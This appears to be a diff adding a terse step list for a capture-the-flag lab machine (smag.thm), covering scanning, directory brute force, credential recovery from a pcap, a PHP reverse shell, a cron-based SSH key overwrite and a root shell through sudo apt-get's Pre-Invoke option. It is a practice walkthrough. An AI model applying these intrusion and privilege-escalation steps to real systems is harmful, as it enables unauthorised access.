@@ -1,0 +1,16 @@
+1 - nmap -A 10.10.135.230
+2 - gobuster dir -u http://10.10.135.230 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+3 - http://10.10.135.230/mail/
+4 - pcap -> Follow TCP Stream
+5 - echo "10.10.135.230 development.smag.thm" | tee -a /etc/hosts
+6 - http://development.smag.thm/login.php
+7 - PHP REVERSE SHELL
+8 - cat /etc/crontab
+9 - ssh-keygen -t rsa
+10 - cat /root/.ssh/id_rsa.pub
+11 - echo "your ssh public key" > /opt/.backups/jake_id_rsa.pub.backup
+12 - ssh jake@10.10.135.230
+13 - cat user.txt
+14 - sudo -l (apt-get)
+15 - sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+16 - cat /root/root.txt
